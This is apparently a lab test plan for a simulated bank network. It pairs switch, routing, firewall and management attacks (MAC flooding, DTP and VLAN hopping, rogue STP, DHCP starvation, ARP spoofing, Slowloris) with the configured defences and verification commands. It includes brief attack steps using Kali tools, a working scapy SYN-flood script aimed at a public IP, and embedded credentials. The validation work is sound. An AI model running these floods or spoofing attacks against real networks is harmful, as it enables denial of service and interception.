### 1. Lab 1.1 — CAM Table Exhaustion / MAC Flooding
* **Target Component:** Access switches (`SW1` VLAN 23, `SW2` VLAN 46, `SW3` VLAN 61, `SW4` VLAN 67) on end-user access ports (`Gi1/0/5+`).
* **Theoretical Mechanism:** An attacker on an access port transmits frames with randomized source MAC addresses to fill the Content Addressable Memory (CAM) table, attempting to force the switch into failing open and broadcasting unicast frames across all ports.
* **Project Defense:** Port Security (`switchport port-security`, `maximum 5`, `mac-address sticky`, `violation shutdown`) and broadcast/multicast Storm Control (`5.00%`, `action trap`).
* **Expected Outcome:** Once more than 5 distinct source MAC addresses are seen on the access port, the switch immediately transitions the interface into the `err-disabled` (`psecure-violation`) state, dropping all traffic from that port. It auto-recovers after 300 seconds (`errdisable recovery`).
* **Defensive Verification Commands (`SW1`–`SW4`):**
  ```text
  show port-security
  show port-security interface GigabitEthernet1/0/5
  show port-security address
  show interfaces status err-disabled
  show errdisable recovery
  show logging | include PORT_SECURITY|PM-4-ERR_DISABLE
  ```
  *(To clear learned sticky MACs after testing: `clear port-security sticky interface GigabitEthernet1/0/5`)*

attack
- connect to either sw1 ports 5-16, sw2 5-7, sw3 5-6, or sw4 5-7
- load kali
- sudo macof to continuously generate random MAC addresses to flood 
- port goes into err-disabled
- recover automatically after 300 seconds or manually `clear port-security sticky interface <interface>`
- show port-security to verify 
---

### 2. Lab 1.2 — Switch Spoofing (DTP Trunk Negotiation & Dormant Port Abuse)
* **Target Component:** Access ports and unused ports on `SW1`–`SW4` and `DSW1`/`DSW2`.
* **Theoretical Mechanism:**
  1. Sending Dynamic Trunking Protocol (DTP) negotiation frames on a user port to negotiate an 802.1Q trunk and gain access to all VLANs.
  2. Plugging into an unused physical switchport to gain unauthorized L2 access.
* **Project Defense:**
  1. `switchport mode access` and `switchport nonegotiate` on all user ports; `switchport trunk allowed vlan <vlan>,99` on uplinks.
  2. Unused ports are administratively `shutdown` and assigned to isolated blackhole `VLAN 727` (`UNUSED_BLACKHOLE`).
* **Expected Outcome:** DTP frames are ignored; the port remains locked in single-VLAN access mode (`Operational Mode: static access`, `Negotiation of Trunking: Off`). Unused ports remain down and isolated from all routed VLANs.
* **Defensive Verification Commands (`SW1`–`SW4`, `DSW1`–`DSW2`):**
  ```text
  show interfaces GigabitEthernet1/0/5 switchport
  show interfaces trunk
  show vlan id 727
  ```

attack
- connect to either sw1 ports 5-16, sw2 5-7, sw3 5-6, or sw4 5-7
- on kali, use sudo yersinia -I
- press h then g then DTP mode, then x to execute, then 1 to launch dtp attack
- trunk does not establish, every user port is set to nonegotiate and manually set to access
- unused ports are set to vlan 727 and shutdown

---

### 3. Lab 1.3 — 802.1Q Double-Tagging (Native VLAN Hopping)
* **Target Component:** Trunk uplinks (`Po1`–`Po5`) between `SW1`–`SW4` and `DSW1`/`DSW2`.
* **Theoretical Mechanism:** Sending a frame with two 802.1Q tags where the outer tag matches the trunk's native VLAN so the first switch strips the outer tag and forwards the inner tag into another VLAN (e.g., reaching Server or ATM VLANs one-way).
* **Project Defense:** All trunk Port-Channels (`Po1`–`Po5`) use a dedicated, unused native VLAN (`switchport trunk native vlan 821`), and VLAN 821 is excluded from the allowed VLAN list and never assigned to any access port.
* **Expected Outcome:** An end-user port is never in the native VLAN (`821`), so outer tags are never stripped as native traffic; frames attempting to hop VLANs are dropped at the ingress access port or trunk boundary.
* **Defensive Verification Commands (`SW1`–`SW4`, `DSW1`–`DSW2`):**
  ```text
  show interfaces trunk
  show interfaces Port-channel1 switchport | include Native|Allowed
  show vlan id 821
  ```

attack
- connect to either sw1 ports 5-16, sw2 5-7, sw3 5-6, or sw4 5-7
- on kali, use sudo yersinia -I
- press h then g then 802.1q, assign VLAN 821 as native
- fails as end user ports are not in VLAN 821
---

### 4. Lab 1.4 — Rogue STP Root Bridge Hijacking (BPDU Injection)
* **Target Component:** Access ports on `SW1`–`SW4` and downlink Port-Channels (`Po1`–`Po4`) on `DSW1`/`DSW2`.
* **Theoretical Mechanism:** A dual-homed host bridges two interfaces and broadcasts Superior Configuration BPDUs (with a bridge priority lower than `DSW1`/`DSW2`) to win the Spanning Tree Root Bridge election and intercept inter-switch traffic as a Layer 2 Man-in-the-Middle.
* **Project Defense:**
  * `spanning-tree portfast` and `spanning-tree bpduguard enable` on all end-user and OOB access ports.
  * `spanning-tree guard root` on DSW downlink Port-Channels (`Po1`–`Po4`).
* **Expected Outcome:** As soon as any BPDU arrives on an access port, BPDU Guard immediately shuts the port down into `err-disabled` (`bpduguard`) state. If a superior BPDU arrives on a DSW downlink trunk, Root Guard places that port into `root-inconsistent` (blocking) state.
* **Defensive Verification Commands (`SW1`–`SW4`, `DSW1`–`DSW2`):**
  ```text
  show spanning-tree summary
  show spanning-tree interface GigabitEthernet1/0/5 detail | include Bpdu|Portfast
  show spanning-tree inconsistentports
  show interfaces status err-disabled
  show logging | include SPANTREE-2-BLOCK_BPDUGUARD
  ```

attack
- sudo ip link add name br0 type bridge
- sudo ip link set eth0 master br0
- sudo ip link set eth1 master br0
- sudo ip link set br0 up
- sudo brctl stp br0 on
- sudo ip link set dev br0 type bridge priority 1
- attack is prevented as all end user ports/oob ports are set to portfast and bpduguard enable
---

### 5. Lab 1.5 — DHCP Starvation & Rogue DHCP Server Spoofing
* **Target Component:** User VLANs (`23`, `46`, `61`, `67`) and DHCP Server `VM107` (`172.16.0.77`).
* **Theoretical Mechanism:**
  1. **DHCP Starvation:** Flooding `DHCPDISCOVER` messages with randomized client hardware addresses (`chaddr` payload) to exhaust the DHCP scopes on `VM107`.
  2. **Rogue DHCP Server:** Responding to legitimate clients with forged `DHCPOFFER`/`DHCPACK` messages pointing the default gateway and DNS server to an attacker-controlled host.
* **Project Defense:**
  1. `ip dhcp snooping limit rate 10` on all access ports (triggers `err-disabled` on `dhcp-rate-limit` when >10 DHCP packets/sec arrive).
  2. `ip dhcp snooping` enabled on VLANs `23, 46, 61, 67` with only uplink trunks (`Po1`, `Po2`) marked `ip dhcp snooping trust`. Untrusted access ports drop all server-to-client messages (`DHCPOFFER`, `DHCPACK`, `DHCPNAK`).
* **Expected Outcome:** High-rate DHCP floods immediately err-disable the access port. Any rogue DHCP offer sent from an access port is silently dropped by the switch and logged.
* **Defensive Verification Commands (`SW1`–`SW4` & `VM107`):**
  ```text
  show ip dhcp snooping
  show ip dhcp snooping binding
  show ip dhcp snooping statistics
  show interfaces status err-disabled
  show logging | include DHCP_SNOOPING
  ```
  On `VM107`:
  ```text
  sudo journalctl -u isc-dhcp-server -n 50
  ```

attack
- sudo apt install ./dhcpig_2.7.3-1_all.deb
- sudo dhcpig-web-open
- select int eth0, mode dhcp exhaustion and start
- attack is prevented, ip dhcp snooping is enabled with trust only on links towards dsw

---

### 6. Lab 1.6 — ARP Cache Poisoning / Gratuitous ARP MitM
* **Target Component:** End hosts and HSRP gateways within VLANs `23`, `46`, `61`, or `67`.
* **Theoretical Mechanism:** Sending unsolicited/forged ARP replies claiming that the default gateway IP (e.g., `172.16.0.57` in HR) belongs to the attacker's MAC address (and vice versa for the victim IP) to intercept traffic at Layer 2.
* **Project Defense:** Dynamic ARP Inspection (`ip arp inspection vlan <23|46|61|67>`), header validation (`ip arp inspection validate src-mac dst-mac ip`), and rate limiting (`ip arp inspection limit rate 15`) on all untrusted user ports.
* **Expected Outcome:** The switch cross-checks every ingress ARP packet against the DHCP Snooping binding table. Any ARP packet with a spoofed Sender IP/MAC mapping or mismatched Ethernet/ARP header MAC is dropped and logged; bursts exceeding 15 pps err-disable the port (`arp-inspection`).
* **Defensive Verification Commands (`SW1`–`SW4`):**
  ```text
  show ip arp inspection
  show ip arp inspection statistics
  show ip arp inspection interfaces
  show logging | include SW_DAI
  ```

attack
- sudo bettercap
- net.probe on
- net.probe off
- net.show
- set arp.spoof.targets 172.16.0.x
- set arp.spoof.targets.fullduplex true
- arp.spoof on
- attack fails as arp inspection is on.

---

### 7. Lab 1.7 — IP & MAC Address Spoofing
* **Target Component:** End-user access ports (`SW1`–`SW4`) attempting to impersonate another host or subnet (e.g., an unauthorized host spoofing an HR IP `172.16.0.61` or another user's leased IP).
* **Theoretical Mechanism:** Manually configuring a static IP (and/or MAC address) belonging to another authorized host to bypass Layer 3 ACLs.
* **Project Defense:** IP Source Guard (`ip verify source`) on all access ports (backed by the DHCP snooping binding table) + sticky Port Security (L2 MAC lock) + DSW SVI inbound ACLs (`ACL_STAFF_IN`, `ACL_ATM_IN`, `ACL_HR_IN`, `ACL_IT_IN`).
* **Expected Outcome:** Any IP packet entering an access port whose source IP does not match that port's active DHCP Snooping binding entry is dropped in hardware at Layer 2 before reaching the distribution switches.
* **Defensive Verification Commands (`SW1`–`SW4`):**
  ```text
  show ip verify source
  show ip source binding
  ```

attack
- fails as we have dhcp snooping...
---

## Module 2: Layer 3/4, Firewall & Server Threat Scenarios

### 8. Lab 2.1 & 2.2 — Unauthorized Inter-VLAN, Server & Out-of-Hours Access
* **Target Component:** Internal Servers (`VLAN 69`: File `.74`, Accounts `.75`, Txn `.76`, DHCP `.77`), DMZ Servers (`VLAN 92`: Web `.82`, DNS `.83`, Jump `.84`/`.85`), and User VLANs (`23, 46, 61, 67`).
* **Theoretical Mechanism:**
  1. Staff or ATM hosts attempting to browse the internet or access the HR File Server (`.74`).
  2. HR or IT hosts attempting to access the Staff/ATM Accounts (`.75`) or Transactions (`.76`) servers.
  3. Cross-VLAN lateral movement between Staff, ATM, HR, and IT subnets.
  4. Transactions Server (`.76`) attempting outbound internet connections outside the scheduled `TXN-WINDOW`.
  5. Tunneling non-HTTP/SSH traffic (e.g., SSH over port 80) through the DMZ or firewall.
* **Project Defense:**
  * DSW inbound SVI ACLs (`ACL_STAFF_IN`, `ACL_ATM_IN`, `ACL_HR_IN`, `ACL_IT_IN`).
  * ASA zone ACLs (`INSIDE_IN`, `SERVER_IN`, `OUTSIDE_IN`) and `time-range TXN-WINDOW`.
  * PA-440 L7 App-ID security rules (`INBOUND-WEB`, `INBOUND-DNS`, `JUMP-SSH-IN`, `INTERNAL-TO-WEB`, `TXN-INTERNET-TIMED` with `schedule TXN-WINDOW`, `DENY-ALL`).
  * Host-level ACLs: Samba `hosts allow = 172.16.0.56/29` on `VM103`; Nginx `allow 172.16.0.0/27; allow 172.16.0.48/29; deny all;` on `VM104`/`VM105`.
* **Expected Outcome:** Unauthorized cross-VLAN or cross-zone packets are dropped at the first hop (DSW SVI ACL) and logged; unauthorized server flows are blocked by the ASA/PA and host firewalls; non-matching L7 applications on open ports are dropped by PA-440 App-ID inspection.
* **Defensive Verification Commands (`DSW1`/`2`, `ASA`, `PA-440`):**
  ```text
  ! On DSW1 / DSW2:
  show ip access-lists
  show logging | include ACL_

  ! On ASA-1010:
  show access-list INSIDE_IN
  show access-list SERVER_IN
  show time-range
  show conn

  ! On PA-440:
  show session all
  show log traffic direction equal backward
  ```

---

### 9. Lab 2.3 — Network Reconnaissance (Ping Sweeps & Port Scanning)
* **Target Component:** Public NAT block (`203.149.210.184/29` on R1, `129.126.142.184/29` on R2) and DMZ servers (`Web .82`, `DNS .83`, `Jump .84`).
* **Theoretical Mechanism:** External or DMZ attacker probing the public subnet using ICMP echo sweeps, TCP SYN scans, TCP ACK scans (to test stateless rules), or UDP port scans to enumerate live hosts and open ports.
* **Project Defense:**
  * R1/R2 `WAN-IN` ACL + `no ip unreachables` on `Gi0/0/0` and `Null0` + `Null0` sinkhole route for unused public IPs.
  * Port-specific static NAT on R1/R2 (only forwards `80/443` -> `.82`, `53` -> `.83`, `2222` -> `.84:22`).
  * Stateful inspection on PA-440 and ASA (drops unsolicited TCP ACK packets with no state table entry).
  * PA-440 Zone Protection profiles `ZP-OUTSIDE` and `ZP-DMZ` with scan protection (`8001` TCP scan, `8002` host sweep, `8003` UDP scan) configured to `block-ip track-by source duration 300`.
* **Expected Outcome:** Closed/unmapped ports return no ICMP unreachable messages (appearing `filtered`), TCP ACK scans are dropped statefully, and rapid port scans or host sweeps trigger PA-440 Zone Protection to quarantine the scanner's source IP for 300 seconds.
* **Defensive Verification Commands (`R1`/`R2`, `PA-440`):**
  ```text
  ! On R1 / R2:
  show ip access-lists WAN-IN
  show ip interface GigabitEthernet0/0/0 | include unreachables|verify

  ! On PA-440:
  show zone-protection zone outside
  show dos-protection zone outside blocked source
  show log threat
  ```

---

### 10. Lab 2.4 — Amplification/Reflection (Smurf & DNS Amplification) and IP Spoofing (BCP 38)
* **Target Component:** Edge routers (`R1`/`R2`), DSW user SVIs, and Public Authoritative DNS Server `VM101` (`203.149.210.190` -> `172.16.0.83`).
* **Theoretical Mechanism:**
  1. **Inbound Spoofing / Smurf Reflection:** Sending packets from the WAN with a spoofed source IP belonging to our own public block (`203.149.210.184/29`), internal `172.16.0.0/24` space, or bogon/private ranges, or targeting a subnet broadcast address.
  2. **DNS Open-Resolver Amplification:** Sending recursive DNS queries from the internet to `203.149.210.190` (with a spoofed victim IP) to amplify UDP responses.
* **Project Defense:**
  1. `WAN-IN` anti-spoofing deny entries (lines 1–9) + strict Unicast RPF (`ip verify unicast source reachable-via rx allow-default`) on R1/R2 `Gi0/0/0` + PA `discard-ip-spoof yes` + IOS default `no ip directed-broadcast`.
  2. `VM101` BIND split-horizon `external` view disables recursion (`recursion no;`), hides version, blocks `AXFR` (`allow-transfer { none; };`), and enforces Response Rate Limiting (`responses-per-second 10; window 5;`).
* **Expected Outcome:** Spoofed inbound packets are dropped at the router perimeter by `WAN-IN` / uRPF; external recursive DNS queries to `.190` are refused (`REFUSED`), and high-rate authoritative queries are rate-limited.
* **Defensive Verification Commands (`R1`/`R2`, `VM101`):**
  ```text
  ! On R1 / R2:
  show ip access-lists WAN-IN
  show ip traffic | include RPF|drop

  ! On VM101 (verify external view refuses recursion and zone transfer):
  sudo named-checkconf
  sudo journalctl -u named -n 50
  ```

attack
- using hping to spoof as a ip address in our network to an intemediary, lets say STAFF vlan who will have 12 end devices
- this fails as we have an acl that blocks packets with spoofed source ip belonging to our public block and internal block

---

### 11. Lab 2.5 — TCP SYN Flood DoS
* **Target Component:** Public Web Server `VM100` (`203.149.210.189` / `172.16.0.82`) and Internal Servers (`172.16.0.74`–`.77`).
* **Theoretical Mechanism:** Flooding the target server with high-rate TCP SYN segments using spoofed source IPs so the server's half-open (`SYN-RECV`) backlog fills up and legitimate clients cannot complete the 3-way handshake.
* **Project Defense:**
  * **PA-440 (`ZP-OUTSIDE`):** `flood tcp-syn enable yes` with `syn-cookies alarm-rate 100 activate-rate 200 maximal-rate 2000` (and UDP/ICMP flood RED profiles).
  * **ASA (`PM_INSIDE_PROTECT` on `inside`/`inside2`):** `set connection conn-max 500 embryonic-conn-max 50 per-client-max 50 per-client-embryonic-max 10`, `set connection timeout embryonic 0:00:15`, and `threat-detection statistics tcp-intercept`.
  * **Server OS (`VM100`–`VM107`):** Kernel `net.ipv4.tcp_syncookies = 1`.
* **Expected Outcome:** When half-open SYN rates cross the threshold (200/s on PA `outside` or 50 embryonic connections on ASA `inside`), the firewall activates SYN cookie / TCP intercept proxying, validating the 3-way handshake before forwarding any SYN to the backend server. Legitimate users can still load the web portal.
* **Defensive Verification Commands (`PA-440`, `ASA`, `VM100`):**
  ```text
  ! On PA-440:
  show counter global filter delta yes | match syn
  show zone-protection zone outside

  ! On ASA-1010:
  show service-policy interface inside
  show threat-detection statistics top tcp-intercept

  ! On VM100:
  sysctl net.ipv4.tcp_syncookies
  ss -s
  ```

tcpsynflood.py
  ```text
  import sys
  from scapy.all import *
  from multiprocessing import Pool
  def synFlood(targetIP, targetPort):
      ip = IP(id=RandShort(), src=RandIP(), dst=targetIP)
      tcp = TCP(
          sport = RandShort(), 
          dport = targetPort,
      seq = RandInt(),
          flags = "S"
      )
      pkt = ip / tcp
      send(pkt, loop=1, verbose=0)
  args = sys.argv[1:]
  if __name__ == "__main__":`
      tIP = args[0]
      tP = int(args[1])
      numProcess = 1
      dataList = [(tIP, tP) for _ in range(numProcess)]
      with Pool(processes=numProcess) as p:
          p.starmap(synFlood, dataList)
  ```
attack
- using tcpsynflood.py to attack VM100 web server
- run sudo python3 tcpsynflood.py 203.149.210.189 443

---

### 12. Lab 2.6 — Slowloris Low-Rate HTTP DoS
* **Target Component:** Public Web Server `VM100` (`172.16.0.82` / `203.149.210.189`) and Internal Accounts/Txn Nginx Portals (`VM104` `.75`, `VM105` `.76`).
* **Theoretical Mechanism:** A single client opens hundreds of concurrent TCP connections to the HTTP/HTTPS server and sends partial HTTP headers very slowly to hold all worker connections open without triggering volumetric flood thresholds.
* **Project Defense:**
  * **PA-440 (`DOS-DMZ-SERVERS`):** Classified DoS profile `DOS-PER-CLIENT` capping any single external client IP at `max-concurrent-limit 50` sessions (`source-ip-only`).
  * **ASA (`PM_INSIDE_PROTECT`):** `set connection ... per-client-max 50` on `inside`/`inside2`.
  * **Host Nginx (`VM100` `/etc/nginx/sites-available/gruppesechs`):** `client_header_timeout 10s;`, `client_body_timeout 10s;`, `keepalive_timeout 15s;`, `limit_conn perip 20;`, and `limit_req zone=reqs burst=40 nodelay;` (`429 Too Many Requests`).
* **Expected Outcome:** A single IP cannot open more than 20 concurrent HTTP connections on Nginx (or 50 total sessions through the PA/ASA), and any connection that fails to complete its HTTP headers within 10 seconds is closed by Nginx. Other clients continue browsing normally.
* **Defensive Verification Commands (`PA-440`, `ASA`, `VM100`):**
  ```text
  ! On PA-440:
  show dos-protection rule DOS-DMZ-SERVERS

  ! On ASA-1010:
  show service-policy interface inside

  ! On VM100:
  sudo tail -n 30 /var/log/nginx/access.log /var/log/nginx/error.log
  ss -tn state established '( dport = :http or dport = :https )'
  ```

attack
- use slowhttptest
- sudo slowhttptest -c 1000 https://gruppesechs.sitic.net
- attack is preventend, similar logic to tcp syn flood
- using mpf to defend

---

## Module 3: OOB Management, AAA & Monitoring Threat Scenarios

### 13. Lab 3.1 — Direct In-Band SSH / Management Plane Bypass Attempt
* **Target Component:** Routers (`R1`, `R2`), Distribution Switches (`DSW1`, `DSW2`), Access Switches (`SW1`–`SW4`), Firewalls (`ASA`, `PA-440`).
* **Theoretical Mechanism:** Attempting to SSH or Telnet directly to a device's production SVI/WAN IP (in-band) or attempting to SSH to an OOB address (`172.16.0.33`–`.42`) from a non-jump host IP.
* **Project Defense:**
  * OOB interfaces (`VLAN 99`, `172.16.0.32/28`) are isolated in `vrf OOB` (or dedicated `Management1/1` / `MGT` planes).
  * `line vty 0 2` enforces `transport input ssh` and `access-class MGMT-ONLY in vrf-also` (permitting only Jump Hosts `172.16.0.44` and `172.16.0.45`; `vty 3 15` and `16 31` have `transport input none`).
  * ASA `ssh` and PA `permitted-ip` likewise restrict management access strictly to `.44` and `.45`.
* **Expected Outcome:** Any SSH/Telnet attempt from user VLANs, server VLANs, or the WAN to any router/switch/firewall IP is refused and logged by `MGMT-ONLY` (`deny any log`). Admin access only succeeds by first authenticating to Jump Host `VM102` (`.84` / `.185:2222`) or `VM106` (`.85`) and then initiating SSH from `.44`/`.45`.
* **Defensive Verification Commands (`R1`, `DSW1`, `SW1`, `ASA`, `PA`):**
  ```text
  show ip access-lists MGMT-ONLY
  show users
  show ssh
  show logging | include MGMT-ONLY|SEC_LOGIN
  ```

---

### 14. Lab 3.2 — SSH / Administrative Brute-Force & Credential Guessing
* **Target Component:** Jump Hosts (`VM102` `.185:2222` / `.84`, `VM106` `.85`), `ASA-1010`, `PA-440`, and Cisco IOS devices.
* **Theoretical Mechanism:** Repeatedly guessing passwords over SSH against the public Jump Host or internal management interfaces.
* **Project Defense:**
  * **Jump Hosts (`VM102`/`VM106`):** `/etc/ssh/sshd_config.d/99-hardening.conf` (`PermitRootLogin no`, `MaxAuthTries 3`, `LoginGraceTime 30`) + `fail2ban` `sshd` jail (`maxretry = 5` within `10m` -> `bantime = 15m`).
  * **PA-440:** `admin-lockout failed-attempts 5 lockout-time 5` and `idle-timeout 10`.
  * **ASA-1010:** `aaa local authentication attempts max-fail 5`.
  * **Cisco IOS:** `ip ssh authentication-retries 3`, `ip ssh time-out 60`, `scrypt` password hashing, and TACACS+ authentication logging.
* **Expected Outcome:** After 5 failed SSH attempts from an external IP to the Jump Host, `fail2ban` bans the offending source IP at the host firewall for 15 minutes. Failed attempts against the PA or ASA lock the account for 5 minutes (or until unlocked on ASA with `clear aaa local user lockout username <user>`).
* **Defensive Verification Commands (`VM102`/`106`, `ASA`, `PA`):**
  ```text
  ! On VM102 / VM106:
  sudo fail2ban-client status sshd
  sudo journalctl -u ssh -n 30

  ! On ASA-1010:
  show aaa local user lockout

  ! On PA-440:
  show admins
  show log system subtype equal auth
  ```

---

### 15. Lab 3.3 & 3.4 — Privilege Escalation / Unauthorized Config Command by Junior Engineer
* **Target Component:** All Cisco IOS devices, `ASA-1010`, and `PA-440` when logged in as a Network Engineer (`donkBonkEng1` or `donkBonkEng2`).
* **Theoretical Mechanism:** A logged-in junior engineer (`donkBonkEng1`) attempts to run high-privilege configuration or destructive commands such as `reload`, `write erase`, `ip access-list ...`, `router ospf 1`, or `username ...`.
* **Project Defense:**
  * **TACACS+ Command Authorization (`tac_plus` on `.44`/`.45`):** `net_engineers` group sets `priv-lvl = 7` and `cli-view-name = "eng-view"`, permitting only `show`, `ping`, `traceroute`, and interface `description`/`shutdown`/`no shutdown`, and denying all other commands.
  * **Local Fallback RBAC:** Cisco IOS `parser view eng-view`, ASA `privilege level 5`, and PA-440 `superreader` role.
  * **AAA Accounting:** `aaa accounting exec default start-stop group tac-group` and `aaa accounting commands 15 default stop-only group tac-group` (and ASA `aaa accounting command TACACS`).
* **Expected Outcome:** Unauthorized commands are rejected (`Command authorization failed` or parser view syntax rejection), and every executed session and command is recorded with user, timestamp, and client IP in the TACACS+ accounting logs on `VM102`/`VM106`.
* **Defensive Verification Commands (`Cisco IOS`, `VM102`/`106`):**
  ```text
  ! On Cisco IOS (as bigDonkBonkAdmin):
  show parser view all
  test aaa group tac-group donkBonkEng1 Beef2Venison legacy

  ! On VM102 / VM106:
  sudo tail -n 50 /var/log/tac_plus.acct /var/log/tac_plus.log
  ```

---

### 16. Lab 3.5 — Rogue NTP Time-Spoofing & Log/Flow Tampering
* **Target Component:** NTP synchronization across all routers, switches, and firewalls (which governs `TXN-WINDOW` time-based ACLs and forensic syslog/NetFlow timestamps).
* **Theoretical Mechanism:** An attacker sends unauthenticated or forged NTP server replies to shift device clocks into the `01:00–03:00` `TXN-WINDOW` (to prematurely open Transactions Server internet access) or desynchronize syslog/NetFlow audit timestamps.
* **Project Defense:**
  * **NTP MD5 Authentication:** `ntp authenticate`, `ntp trusted-key 1`, `ntp authentication-key 1 md5 bigBoyNTPkey` on all Cisco IOS devices, ASA, and PA-440, matched against `/etc/chrony/chrony.keys` on `VM102` (`.44`) and `VM106` (`.45`).
  * **NTP Access Control:** `ip access-list standard NTP-SERVERS` (permitting only `.44` and `.45`) bound via `ntp access-group peer NTP-SERVERS` and `ntp logging`.
  * **OOB Transport:** All NTP, Syslog (`UDP 514`), and Flexible NetFlow v9 (`UDP 2055`) traffic is isolated inside `vrf OOB` (`VLAN 99`).
* **Expected Outcome:** Any NTP packet lacking a valid MD5 signature with key 1 (`bigBoyNTPkey`) or originating from any IP other than `.44`/`.45` is rejected (`insane`/`unauthenticated`), preserving accurate time sync and protecting the `TXN-WINDOW` schedule.
* **Defensive Verification Commands (`Cisco IOS`, `ASA`, `PA`, `VM102`/`106`):**
  ```text
  ! On Cisco IOS & ASA:
  show ntp status
  show ntp associations detail

  ! On PA-440:
  show ntp

  ! On R1 / R2 / DSW1 / DSW2 (NetFlow & Syslog verification):
  show flow monitor bank-flow-monitor cache
  show flow exporter statistics
  show logging
  ```

